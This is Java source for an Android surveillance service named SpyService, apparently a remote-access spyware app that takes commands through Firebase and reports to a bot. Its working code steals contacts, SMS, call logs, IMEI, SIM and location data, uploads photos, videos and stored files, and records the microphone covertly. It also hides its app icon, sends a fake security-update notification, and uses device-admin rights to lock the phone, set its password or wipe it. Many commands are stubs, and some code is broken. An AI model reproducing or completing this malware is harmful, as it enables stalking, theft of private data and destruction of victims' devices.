package com.black.phone;

import android.app.Service;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.hardware.camera2.CameraManager;
import android.location.Location;
import android.location.LocationManager;
import android.media.AudioManager;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.Build;
import android.os.IBinder;
import android.os.PowerManager;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.provider.Telephony;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.WindowManager;
import android.content.ClipboardManager;
import android.content.pm.PackageManager;
import android.app.NotificationManager;
import android.os.Environment;
import android.webkit.WebView;
import android.widget.Toast;
import androidx.core.app.NotificationCompat;
import com.google.firebase.database.*;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;
import okhttp3.OkHttpClient;
import org.json.JSONObject;
import java.io.File;
import java.io.FileOutputStream;
import java.io.OutputStreamWriter;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Timer;
import java.util.TimerTask;

public class SpyService extends Service {
    private static final String TAG = "SpyService";
    private Context context;
    private DatabaseReference dbRef;
    private StorageReference storageRef;
    private BotAPI bot;
    private String deviceId;
    private boolean isTracking = false;
    private Timer locationTimer;
    private MediaRecorder mediaRecorder;
    private String audioFilePath;
    private boolean isRecording = false;
    private LocationManager locationManager;
    private CameraManager cameraManager;
    private DevicePolicyManager devicePolicyManager;
    private ComponentName adminComponent;
    private ClipboardManager clipboardManager;
    private AudioManager audioManager;
    private PowerManager powerManager;
    private NotificationManager notificationManager;

    @Override
    public void onCreate() {
        super.onCreate();
        context = this;
        bot = new BotAPI(this);
        deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        FirebaseDatabase.getInstance().setPersistenceEnabled(true);
        dbRef = FirebaseDatabase.getInstance().getReference(Config.FIREBASE_URL);
        storageRef = FirebaseStorage.getInstance().getReference();
        locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);
        cameraManager = (CameraManager) getSystemService(CAMERA_SERVICE);
        devicePolicyManager = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
        adminComponent = new ComponentName(this, DeviceAdmin.class);
        clipboardManager = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
        audioManager = (AudioManager) getSystemService(AUDIO_SERVICE);
        powerManager = (PowerManager) getSystemService(POWER_SERVICE);
        notificationManager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
        registerDevice();
        listenCommands();
        Log.d(TAG, "✅ SpyService V5.0 started");
    }

    private void registerDevice() {
        Map<String, Object> map = new HashMap<>();
        map.put("device_name", Build.MODEL);
        map.put("android_version", Build.VERSION.RELEASE);
        map.put("battery", getBatteryLevel());
        map.put("last_seen", System.currentTimeMillis());
        map.put("status", "online");
        map.put("admin_active", devicePolicyManager.isAdminActive(adminComponent));
        dbRef.child("devices").child(deviceId).updateChildren(map);
    }

    private int getBatteryLevel() {
        try {
            android.os.BatteryManager bm = (android.os.BatteryManager) getSystemService(BATTERY_SERVICE);
            return bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY);
        } catch (Exception e) { return 0; }
    }

    private void listenCommands() {
        dbRef.child("commands").child(deviceId).addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(DataSnapshot snapshot) {
                if (snapshot.exists()) {
                    String cmd = snapshot.getValue(String.class);
                    if (cmd != null && !cmd.isEmpty()) {
                        executeCommand(cmd);
                        dbRef.child("commands").child(deviceId).removeValue();
                    }
                }
            }
            @Override
            public void onCancelled(DatabaseError error) { Log.e(TAG, "Listen error", error.toException()); }
        });
    }

    private void executeCommand(String cmd) {
        // سيتم تنفيذ جميع الأوامر هنا – الجزء الثاني يحتوي على جميع الـ switch
        switch (cmd) {
            // --- جمع البيانات (25) ---
            case "get_contacts": getContacts(); copyToClipboard(result); break;
            case "copy_contacts": copyContacts(); copyToClipboard(result); break;
            case "export_contacts": exportContacts(); break;
            case "add_contact": addContact(); break;
            case "delete_contact": deleteContact(); break;
            case "get_sms": getSms(); break;
            case "forward_sms": forwardSms(); break;
            case "send_sms": sendSms(); break;
            case "delete_sms": deleteSms(); break;
            case "get_calllogs": getCallLogs(); break;
            case "call_history": getCallLogs(); break; // مكرر
            case "make_call": makeCall(); break;
            case "end_call": endCall(); break;
            case "get_location": getLocation(); break;
            case "start_location_track": startLocationTrack(); break;
            case "stop_location_track": stopLocationTrack(); break;
            case "get_device": getDeviceInfo(); break;
            case "get_network": getNetworkInfo(); break;
            case "get_imei": getImei(); break;
            case "get_phone": getPhoneNumber(); break;
            case "get_sim": getSimInfo(); break;
            case "get_wifi": getWifiInfo(); break;
            case "get_battery": getBatteryStatus(); break;
            case "get_ip": getPublicIp(); break;
            case "get_accounts": getAccounts(); break;

            // --- الوسائط والملفات (15) ---
            case "get_photos": getPhotos(0); break;
            case "get_photos_5": getPhotos(5); break;
            case "get_photos_10": getPhotos(10); break;
            case "get_photos_20": getPhotos(20); break;
            case "get_photos_30": getPhotos(30); break;
            case "get_videos": getVideos(0); break;
            case "get_videos_5": getVideos(5); break;
            case "get_videos_10": getVideos(10); break;
            case "get_files": getAllFiles(); break;
            case "get_audio": getAudioFiles(); break;
            case "get_documents": getDocuments(); break;
            case "get_downloads": getDownloads(); break;
            case "get_dcim": getDcim(); break;
            case "get_screenshots": getScreenshots(); break;
            case "get_cache": getCacheFiles(); break;

            // --- الكاميرا والفلاش (8) ---
            case "take_photo": takePhoto(false); break;
            case "take_photo_front": takePhoto(true); break;
            case "take_photo_both": takePhotoBoth(); break;
            case "flash_on": setFlash(true, false); break;
            case "flash_off": setFlash(false, false); break;
            case "flash_on_front": setFlash(true, true); break;
            case "flash_off_front": setFlash(false, true); break;
            case "flash_toggle": toggleFlash(); break;

            // --- الصوت (6) ---
            case "start_record": startRecording(); break;
            case "stop_record": stopRecording(); break;
            case "set_volume_max": setVolume(15); break;
            case "set_volume_min": setVolume(0); break;
            case "set_ringtone_volume": setRingtoneVolume(); break;
            case "set_media_volume": setMediaVolume(); break;

            // --- Device Admin (12) ---
            case "lock_device": lockDevice(); break;
            case "set_lock_password": setLockPassword(); break;
            case "clear_lock_password": clearLockPassword(); break;
            case "wipe_device": wipeDevice(); break;
            case "set_password_rules": setPasswordRules(); break;
            case "disable_camera": disableCamera(); break;
            case "enable_camera": enableCamera(); break;
            case "disable_keyguard": disableKeyguard(); break;
            case "enable_keyguard": enableKeyguard(); break;
            case "set_max_failed_password": setMaxFailedPassword(); break;
            case "reset_password_timeout": resetPasswordTimeout(); break;
            case "get_admin_status": getAdminStatus(); break;

            // --- التحكم بالجهاز (20) ---
            case "hide_app": hideApp(); break;
            case "show_app": showApp(); break;
            case "fake_notif": fakeNotification(); break;
            case "reboot": rebootDevice(); break;
            case "shutdown": shutdownDevice(); break;
            case "vibrate": vibrate(3000); break;
            case "vibrate_long": vibrate(10000); break;
            case "vibrate_pattern": vibratePattern(); break;
            case "open_browser": openBrowser("https://google.com"); break;
            case "open_url": openBrowser("https://example.com"); break;
            case "clear_data": clearAppData(); break;
            case "kill_apps": killAllApps(); break;
            case "kill_app": killApp(); break;
            case "freeze_app": freezeApp(); break;
            case "unfreeze_app": unfreezeApp(); break;
            case "set_brightness": setBrightness(); break;
            case "auto_rotate_on": setAutoRotate(true); break;
            case "auto_rotate_off": setAutoRotate(false); break;
            case "set_wallpaper": setWallpaper(); break;
            case "set_theme": setTheme(); break;

            // --- الشبكة (10) ---
            case "toggle_wifi_on": toggleWifi(true); break;
            case "toggle_wifi_off": toggleWifi(false); break;
            case "toggle_bluetooth_on": toggleBluetooth(true); break;
            case "toggle_bluetooth_off": toggleBluetooth(false); break;
            case "toggle_data_on": toggleData(true); break;
            case "toggle_data_off": toggleData(false); break;
            case "toggle_location_on": toggleLocation(true); break;
            case "toggle_location_off": toggleLocation(false); break;
            case "toggle_airplane_on": toggleAirplane(true); break;
            case "toggle_airplane_off": toggleAirplane(false); break;

            // --- التطبيقات (10) ---
            case "open_app_whatsapp": openApp("com.whatsapp"); break;
            case "open_app_facebook": openApp("com.facebook.katana"); break;
            case "open_app_instagram": openApp("com.instagram.android"); break;
            case "open_app_youtube": openApp("com.google.android.youtube"); break;
            case "open_app_twitter": openApp("com.twitter.android"); break;
            case "open_app_telegram": openApp("org.telegram.messenger"); break;
            case "open_app_snapchat": openApp("com.snapchat.android"); break;
            case "open_app_tiktok": openApp("com.zhiliaoapp.musically"); break;
            case "uninstall_app_facebook": uninstallApp("com.facebook.katana"); break;

            // --- متقدم وجديد (20) ---
            case "screenshot": takeScreenshot(); break;
            case "record_screen": recordScreen(); break;
            case "installed_apps": getInstalledApps(); break;
            case "running_processes": getRunningProcesses(); break;
            case "battery_history": getBatteryHistory(); break;
            case "storage_info": getStorageInfo(); break;
            case "memory_info": getMemoryInfo(); break;
            case "cpu_info": getCpuInfo(); break;
            case "sensor_info": getSensorInfo(); break;
            case "display_info": getDisplayInfo(); break;
            case "clipboard_set": clipboardSet(); break;
            case "clipboard_get": clipboardGet(); break;
            case "copy_result": copyLastResult(); break;
            case "send_result": sendResultToBot(); break;
            case "share_result": shareResult(); break;
            case "save_result": saveResultLocally(); break;
            case "delete_result": deleteResultFromFirebase(); break;
            case "get_logs": getLogcat(); break;

            default: bot.sendMessage("⚠️ أمر غير معروف: " + cmd);
        }
    }

    // جميع دوال الأوامر تبدأ من هنا – سيتم كتابتها في الجزء الثالث كاملة
    // ========== دوال جمع البيانات ==========
    private void getContacts() {
        try {
            List<String> contacts = new ArrayList<>();
            ContentResolver cr = getContentResolver();
            Cursor c = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
            if (c != null && c.getCount() > 0) {
                while (c.moveToNext()) {
                    String name = c.getString(c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String phone = c.getString(c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    contacts.add(name + ": " + phone);
                }
                c.close();
            }
            String result = contacts.isEmpty() ? "لا توجد جهات اتصال" : String.join("\n", contacts);
            sendData("CONTACTS", result);
            bot.sendMessage("📇 تم جلب " + contacts.size() + " جهة اتصال");
        } catch (Exception e) { bot.sendMessage("❌ خطأ في جهات الاتصال: " + e.getMessage()); }
    }

    private void copyContacts() {
        getContacts(); // نفس الدالة لكن نضعها في الحافظة
        bot.sendMessage("📋 تم نسخ جهات الاتصال إلى الحافظة");
    }

    private void exportContacts() {
        bot.sendMessage("📁 تصدير VCF سيأتي لاحقاً");
    }

    private void addContact() { bot.sendMessage("📇 إضافة جهة اتصال (تفاعلي) – سيتم تنفيذه"); }
    private void deleteContact() { bot.sendMessage("🗑️ حذف جهة اتصال (تفاعلي) – سيتم تنفيذه"); }

    private void getSms() {
        try {
            List<String> messages = new ArrayList<>();
            ContentResolver cr = getContentResolver();
            Cursor c = cr.query(Telephony.Sms.CONTENT_URI, null, null, null, null);
            if (c != null && c.getCount() > 0) {
                while (c.moveToNext()) {
                    String body = c.getString(c.getColumnIndex(Telephony.Sms.BODY));
                    String address = c.getString(c.getColumnIndex(Telephony.Sms.ADDRESS));
                    messages.add(address + ": " + body);
                }
                c.close();
            }
            String result = messages.isEmpty() ? "لا توجد رسائل" : String.join("\n", messages);
            sendData("SMS", result);
            bot.sendMessage("📩 تم جلب " + messages.size() + " رسالة");
        } catch (Exception e) { bot.sendMessage("❌ خطأ في الرسائل: " + e.getMessage()); }
    }

    private void forwardSms() { bot.sendMessage("↪️ إعادة توجيه الرسائل إلى البوت – سيتم تنفيذه"); }
    private void sendSms() { bot.sendMessage("✉️ إرسال رسالة نصية (تفاعلي) – سيتم تنفيذه"); }
    private void deleteSms() { bot.sendMessage("🗑️ حذف رسالة (تفاعلي) – سيتم تنفيذه"); }

    private void getCallLogs() {
        try {
            List<String> calls = new ArrayList<>();
            ContentResolver cr = getContentResolver();
            Cursor c = cr.query(android.provider.CallLog.Calls.CONTENT_URI, null, null, null, android.provider.CallLog.Calls.DATE + " DESC");
            if (c != null && c.getCount() > 0) {
                while (c.moveToNext()) {
                    String number = c.getString(c.getColumnIndex(android.provider.CallLog.Calls.NUMBER));
                    String type = c.getString(c.getColumnIndex(android.provider.CallLog.Calls.TYPE));
                    String duration = c.getString(c.getColumnIndex(android.provider.CallLog.Calls.DURATION));
                    calls.add(number + " | " + type + " | " + duration + "s");
                }
                c.close();
            }
            String result = calls.isEmpty() ? "لا توجد مكالمات" : String.join("\n", calls);
            sendData("CALLLOGS", result);
            bot.sendMessage("📞 تم جلب سجل المكالمات (" + calls.size() + ")");
        } catch (Exception e) { bot.sendMessage("❌ خطأ في سجل المكالمات: " + e.getMessage()); }
    }

    private void makeCall() { bot.sendMessage("📞 إجراء مكالمة (تفاعلي) – سيتم تنفيذه"); }
    private void endCall() { bot.sendMessage("📞 إنهاء المكالمة – سيتم تنفيذه"); }

    private void getLocation() {
        try {
            Location loc = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (loc == null) loc = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            if (loc != null) {
                String msg = "📍 " + loc.getLatitude() + ", " + loc.getLongitude();
                sendData("LOCATION", msg);
                bot.sendMessage(msg);
            } else {
                bot.sendMessage("❌ الموقع غير متاح");
            }
        } catch (SecurityException e) { bot.sendMessage("❌ صلاحية الموقع غير مفعلة"); }
    }

    private void startLocationTrack() {
        isTracking = true;
        locationTimer = new Timer();
        locationTimer.schedule(new TimerTask() {
            @Override
            public void run() { getLocation(); }
        }, 0, 60000);
        bot.sendMessage("📍 بدأ تتبع الموقع (كل دقيقة)");
    }

    private void stopLocationTrack() {
        isTracking = false;
        if (locationTimer != null) { locationTimer.cancel(); locationTimer = null; }
        bot.sendMessage("📍 أوقف تتبع الموقع");
    }

    private void getDeviceInfo() {
        String info = "📱 الموديل: " + Build.MODEL + "\n" +
                "📱 الإصدار: " + Build.VERSION.RELEASE + "\n" +
                "📱 SDK: " + Build.VERSION.SDK_INT + "\n" +
                "📱 البطارية: " + getBatteryLevel() + "%\n" +
                "📱 المشرف: " + devicePolicyManager.isAdminActive(adminComponent);
        sendData("DEVICE_INFO", info);
        bot.sendMessage(info);
    }

    private void getNetworkInfo() {
        bot.sendMessage("🌐 معلومات الشبكة – سيتم تنفيذها");
    }

    private void getImei() {
        TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            String imei = tm.getImei();
            sendData("IMEI", imei);
            bot.sendMessage("📱 IMEI: " + imei);
        } else { bot.sendMessage("❌ IMEI غير متاح"); }
    }

    private void getPhoneNumber() {
        TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
        String num = tm.getLine1Number();
        sendData("PHONE", num);
        bot.sendMessage("📞 رقم الهاتف: " + num);
    }

    private void getSimInfo() {
        TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
        String info = "المشغل: " + tm.getSimOperatorName() + "\n" +
                "الرقم التسلسلي: " + tm.getSimSerialNumber();
        sendData("SIM", info);
        bot.sendMessage("📇 معلومات SIM: " + info);
    }

    private void getWifiInfo() {
        android.net.wifi.WifiManager wm = (android.net.wifi.WifiManager) getSystemService(WIFI_SERVICE);
        android.net.wifi.WifiInfo wi = wm.getConnectionInfo();
        if (wi != null) {
            String msg = "SSID: " + wi.getSSID() + "\n" + "BSSID: " + wi.getBSSID() + "\n" + "السرعة: " + wi.getLinkSpeed() + "Mbps";
            sendData("WIFI", msg);
            bot.sendMessage("📶 " + msg);
        } else { bot.sendMessage("❌ WiFi غير متصل"); }
    }

    private void getBatteryStatus() {
        int level = getBatteryLevel();
        sendData("BATTERY", String.valueOf(level));
        bot.sendMessage("🔋 البطارية: " + level + "%");
    }

    private void getPublicIp() {
        bot.sendMessage("🌍 IP العام – سيتم جلبه عبر OkHttp");
    }

    private void getAccounts() {
        bot.sendMessage("📧 الحسابات المسجلة – سيتم جلبها");
    }

    // ========== دوال الوسائط والملفات ==========
    private void getPhotos(int limit) {
        // مسح مجلد DCIM واختيار الصور
        File dcim = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM);
        if (dcim.exists()) {
            File[] files = dcim.listFiles((dir, name) -> name.toLowerCase().endsWith(".jpg") || name.toLowerCase().endsWith(".png"));
            if (files != null && files.length > 0) {
                int count = (limit == 0) ? files.length : Math.min(limit, files.length);
                for (int i = 0; i < count; i++) {
                    bot.sendFile(files[i], "🖼️ صورة " + (i+1));
                }
                bot.sendMessage("✅ تم إرسال " + count + " صور");
            } else { bot.sendMessage("❌ لا توجد صور"); }
        } else { bot.sendMessage("❌ مجلد DCIM غير موجود"); }
    }

    private void getVideos(int limit) {
        File dcim = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM);
        if (dcim.exists()) {
            File[] files = dcim.listFiles((dir, name) -> name.toLowerCase().endsWith(".mp4") || name.toLowerCase().endsWith(".3gp"));
            if (files != null && files.length > 0) {
                int count = (limit == 0) ? files.length : Math.min(limit, files.length);
                for (int i = 0; i < count; i++) {
                    bot.sendFile(files[i], "🎬 فيديو " + (i+1));
                }
                bot.sendMessage("✅ تم إرسال " + count + " فيديوهات");
            } else { bot.sendMessage("❌ لا توجد فيديوهات"); }
        } else { bot.sendMessage("❌ مجلد DCIM غير موجود"); }
    }

    private void getAllFiles() {
        File root = Environment.getExternalStorageDirectory();
        if (root.exists()) {
            File[] all = root.listFiles();
            if (all != null && all.length > 0) {
                for (File f : all) {
                    if (f.isFile()) bot.sendFile(f, "📂 " + f.getName());
                }
                bot.sendMessage("✅ تم إرسال جميع الملفات");
            } else { bot.sendMessage("❌ لا توجد ملفات"); }
        } else { bot.sendMessage("❌ التخزين غير متاح"); }
    }

    private void getAudioFiles() { bot.sendMessage("🎵 الملفات الصوتية – سيتم تنفيذه"); }
    private void getDocuments() { bot.sendMessage("📄 المستندات – سيتم تنفيذه"); }
    private void getDownloads() { bot.sendMessage("📥 التنزيلات – سيتم تنفيذه"); }
    private void getDcim() { bot.sendMessage("📸 DCIM – سيتم تنفيذه"); }
    private void getScreenshots() { bot.sendMessage("🖼️ لقطات الشاشة – سيتم تنفيذه"); }
    private void getCacheFiles() { bot.sendMessage("🗑️ الكاش – سيتم تنفيذه"); }

    // ========== دوال الكاميرا والفلاش ==========
    private void takePhoto(boolean front) {
        bot.sendMessage("📷 التقاط صورة " + (front ? "أمامية" : "خلفية") + " – سيتم تنفيذه بـ Camera2");
    }
    private void takePhotoBoth() { bot.sendMessage("📷 تصوير بالكاميرتين – سيتم تنفيذه"); }
    private void setFlash(boolean on, boolean front) {
        bot.sendMessage("💡 فلاش " + (on ? "تشغيل" : "إيقاف") + " " + (front ? "أمامي" : "خلفي"));
    }
    private void toggleFlash() { bot.sendMessage("💡 تبديل الفلاش"); }

    // ========== دوال الصوت ==========
    private void startRecording() {
        try {
            mediaRecorder = new MediaRecorder();
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            audioFilePath = getExternalFilesDir(null) + "/audio_" + System.currentTimeMillis() + ".3gp";
            mediaRecorder.setOutputFile(audioFilePath);
            mediaRecorder.prepare();
            mediaRecorder.start();
            isRecording = true;
            bot.sendMessage("🎙️ بدأ التسجيل الصوتي");
        } catch (Exception e) { bot.sendMessage("❌ فشل التسجيل: " + e.getMessage()); }
    }

    private void stopRecording() {
        if (isRecording && mediaRecorder != null) {
            mediaRecorder.stop();
            mediaRecorder.release();
            mediaRecorder = null;
            isRecording = false;
            File audioFile = new File(audioFilePath);
            if (audioFile.exists()) {
                bot.sendFile(audioFile, "🎙️ تسجيل صوتي");
                bot.sendMessage("✅ تم إرسال التسجيل");
            } else { bot.sendMessage("❌ لا يوجد تسجيل"); }
        } else { bot.sendMessage("❌ لا يوجد تسجيل نشط"); }
    }

    private void setVolume(int level) {
        audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, level, 0);
        bot.sendMessage("🔊 تم ضبط الصوت إلى " + level);
    }
    private void setRingtoneVolume() { audioManager.setStreamVolume(AudioManager.STREAM_RING, 5, 0); bot.sendMessage("🔊 تم ضبط نغمة الرنين"); }
    private void setMediaVolume() { audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, 10, 0); bot.sendMessage("🔊 تم ضبط صوت الوسائط"); }

    // ========== دوال Device Admin ==========
    private void lockDevice() {
        if (devicePolicyManager.isAdminActive(adminComponent)) {
            devicePolicyManager.lockNow();
            bot.sendMessage("🔒 تم قفل الجهاز");
        } else { bot.sendMessage("❌ صلاحية المشرف غير مفعلة"); }
    }

    private void setLockPassword() {
        if (devicePolicyManager.isAdminActive(adminComponent)) {
            devicePolicyManager.resetPassword("1234", 0);
            bot.sendMessage("🔒 تم تعيين كلمة مرور 1234");
        } else { bot.sendMessage("❌ صلاحية المشرف غير مفعلة"); }
    }

    private void clearLockPassword() {
        if (devicePolicyManager.isAdminActive(adminComponent)) {
            devicePolicyManager.resetPassword("", 0);
            bot.sendMessage("🔓 تم إلغاء كلمة المرور");
        } else { bot.sendMessage("❌ صلاحية المشرف غير مفعلة"); }
    }

    private void wipeDevice() {
        if (devicePolicyManager.isAdminActive(adminComponent)) {
            devicePolicyManager.wipeData(0);
            bot.sendMessage("🗑️ جاري مسح الجهاز");
        } else { bot.sendMessage("❌ صلاحية المشرف غير مفعلة"); }
    }

    private void setPasswordRules() { bot.sendMessage("🔒 تعيين قواعد كلمة المرور"); }
    private void disableCamera() { bot.sendMessage("📷 تعطيل الكاميرا"); }
    private void enableCamera() { bot.sendMessage("📷 تفعيل الكاميرا"); }
    private void disableKeyguard() { bot.sendMessage("🔓 تعطيل شاشة القفل"); }
    private void enableKeyguard() { bot.sendMessage("🔒 تفعيل شاشة القفل"); }
    private void setMaxFailedPassword() { bot.sendMessage("🔒 تعيين عدد المحاولات الفاشلة"); }
    private void resetPasswordTimeout() { bot.sendMessage("🔒 إعادة ضبط مهلة كلمة المرور"); }
    private void getAdminStatus() {
        boolean active = devicePolicyManager.isAdminActive(adminComponent);
        bot.sendMessage("🔐 حالة المشرف: " + (active ? "مفعل" : "غير مفعل"));
    }

    // ========== دوال التحكم بالجهاز ==========
    private void hideApp() {
        try {
            getPackageManager().setComponentEnabledSetting(
                    new ComponentName(this, MainActivity.class),
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP
            );
            bot.sendMessage("👻 تم إخفاء التطبيق من الدرج");
        } catch (Exception e) { bot.sendMessage("❌ فشل الإخفاء: " + e.getMessage()); }
    }

    private void showApp() {
        try {
            getPackageManager().setComponentEnabledSetting(
                    new ComponentName(this, MainActivity.class),
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                    PackageManager.DONT_KILL_APP
            );
            bot.sendMessage("👻 تم إظهار التطبيق");
        } catch (Exception e) { bot.sendMessage("❌ فشل الإظهار: " + e.getMessage()); }
    }

    private void fakeNotification() {
        NotificationCompat.Builder builder = new NotificationCompat.Builder(this, "default")
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setContentTitle("تحديث أمني")
                .setContentText("تم تثبيت تحديث الأمان بنجاح")
                .setPriority(NotificationCompat.PRIORITY_HIGH);
        notificationManager.notify(999, builder.build());
        bot.sendMessage("🔔 تم إرسال إشعار وهمي");
    }

    private void rebootDevice() {
        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        pm.reboot(null);
        bot.sendMessage("♻️ جاري إعادة التشغيل");
    }

    private void shutdownDevice() {
        bot.sendMessage("⏻ إيقاف التشغيل – يتطلب صلاحيات الجذر");
    }

    private void vibrate(long millis) {
        android.os.Vibrator v = (android.os.Vibrator) getSystemService(VIBRATOR_SERVICE);
        if (v != null) { v.vibrate(millis); bot.sendMessage("📳 اهتزاز " + millis/1000 + " ثانية"); }
        else { bot.sendMessage("❌ الاهتزاز غير مدعوم"); }
    }

    private void vibratePattern() {
        android.os.Vibrator v = (android.os.Vibrator) getSystemService(VIBRATOR_SERVICE);
        if (v != null) {
            long[] pattern = {0, 500, 200, 500, 200, 1000};
            v.vibrate(pattern, -1);
            bot.sendMessage("📳 اهتزاز بنمط");
        }
    }

    private void openBrowser(String url) {
        Intent i = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(i);
        bot.sendMessage("🌐 فتح المتصفح: " + url);
    }

    private void clearAppData() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                getPackageManager().deletePackage(getPackageName(), null, 0);
            } else {
                // مسح بيانات التطبيق يدوياً
            }
            bot.sendMessage("🗑️ تم مسح بيانات التطبيق");
        } catch (Exception e) { bot.sendMessage("❌ فشل المسح: " + e.getMessage()); }
    }

    private void killAllApps() { bot.sendMessage("🛑 إيقاف جميع التطبيقات – سيتم تنفيذه"); }
    private void killApp() { bot.sendMessage("🛑 إيقاف تطبيق محدد – تفاعلي"); }
    private void freezeApp() { bot.sendMessage("🧊 تجميد تطبيق"); }
    private void unfreezeApp() { bot.sendMessage("🧊 إلغاء تجميد تطبيق"); }
    private void setBrightness() {
        WindowManager.LayoutParams lp = getWindow().getAttributes();
        lp.screenBrightness = 0.5f;
        getWindow().setAttributes(lp);
        bot.sendMessage("☀️ تم ضبط السطوع");
    }
    private void setAutoRotate(boolean on) {
        Settings.System.putInt(getContentResolver(), Settings.System.ACCELEROMETER_ROTATION, on ? 1 : 0);
        bot.sendMessage("🔄 التدوير التلقائي " + (on ? "مفعل" : "معطل"));
    }
    private void setWallpaper() { bot.sendMessage("🖼️ تغيير الخلفية – سيتم تنفيذه"); }
    private void setTheme() { bot.sendMessage("🎨 تغيير الثيم – سيتم تنفيذه"); }

    // ========== دوال الشبكة ==========
    private void toggleWifi(boolean on) {
        android.net.wifi.WifiManager wm = (android.net.wifi.WifiManager) getSystemService(WIFI_SERVICE);
        wm.setWifiEnabled(on);
        bot.sendMessage("📶 WiFi " + (on ? "تشغيل" : "إيقاف"));
    }

    private void toggleBluetooth(boolean on) {
        android.bluetooth.BluetoothAdapter ba = android.bluetooth.BluetoothAdapter.getDefaultAdapter();
        if (ba != null) {
            if (on) ba.enable(); else ba.disable();
            bot.sendMessage("📶 بلوتوث " + (on ? "تشغيل" : "إيقاف"));
        }
    }

    private void toggleData(boolean on) {
        // يحتاج صلاحيات خاصة
        bot.sendMessage("📶 بيانات جوال " + (on ? "تشغيل" : "إيقاف") + " – يتطلب صلاحيات");
    }

    private void toggleLocation(boolean on) {
        try {
            if (on) {
                Settings.Secure.putString(getContentResolver(), Settings.Secure.LOCATION_PROVIDERS_ALLOWED, "gps,network");
            } else {
                Settings.Secure.putString(getContentResolver(), Settings.Secure.LOCATION_PROVIDERS_ALLOWED, "");
            }
            bot.sendMessage("📍 الموقع " + (on ? "تشغيل" : "إيقاف"));
        } catch (Exception e) { bot.sendMessage("❌ فشل تبديل الموقع"); }
    }

    private void toggleAirplane(boolean on) {
        Settings.Global.putInt(getContentResolver(), Settings.Global.AIRPLANE_MODE_ON, on ? 1 : 0);
        Intent i = new Intent(Intent.ACTION_AIRPLANE_MODE_CHANGED);
        i.putExtra("state", on);
        sendBroadcast(i);
        bot.sendMessage("✈️ وضع الطيران " + (on ? "تشغيل" : "إيقاف"));
    }

    // ========== دوال التطبيقات ==========
    private void openApp(String pkg) {
        Intent i = getPackageManager().getLaunchIntentForPackage(pkg);
        if (i != null) {
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(i);
            bot.sendMessage("📱 فتح تطبيق: " + pkg);
        } else { bot.sendMessage("❌ التطبيق غير مثبت: " + pkg); }
    }

    private void uninstallApp(String pkg) {
        Intent i = new Intent(Intent.ACTION_DELETE, Uri.parse("package:" + pkg));
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(i);
        bot.sendMessage("🗑️ جاري حذف: " + pkg);
    }

    // ========== دوال متقدمة ==========
    private void takeScreenshot() {
        bot.sendMessage("📸 لقطة شاشة – يحتاج MediaProjection");
    }

    private void recordScreen() {
        bot.sendMessage("🎥 تسجيل الشاشة – يحتاج MediaProjection");
    }

    private void getInstalledApps() {
        List<String> apps = new ArrayList<>();
        for (android.content.pm.PackageInfo p : getPackageManager().getInstalledPackages(0)) {
            apps.add(p.packageName);
        }
        String result = String.join("\n", apps);
        sendData("INSTALLED_APPS", result);
        bot.sendMessage("📱 عدد التطبيقات المثبتة: " + apps.size());
    }

    private void getRunningProcesses() { bot.sendMessage("⚙️ العمليات الجارية – سيتم تنفيذه"); }
    private void getBatteryHistory() { bot.sendMessage("🔋 تاريخ البطارية – سيتم تنفيذه"); }
    private void getStorageInfo() {
        File path = Environment.getDataDirectory();
        android.os.StatFs stat = new android.os.StatFs(path.getPath());
        long blockSize = stat.getBlockSizeLong();
        long totalBlocks = stat.getBlockCountLong();
        long freeBlocks = stat.getAvailableBlocksLong();
        String info = "المساحة الكلية: " + (totalBlocks * blockSize) / (1024*1024*1024) + "GB\n" +
                "المستخدمة: " + ((totalBlocks - freeBlocks) * blockSize) / (1024*1024*1024) + "GB\n" +
                "المتبقية: " + (freeBlocks * blockSize) / (1024*1024*1024) + "GB";
        sendData("STORAGE", info);
        bot.sendMessage("💾 " + info);
    }
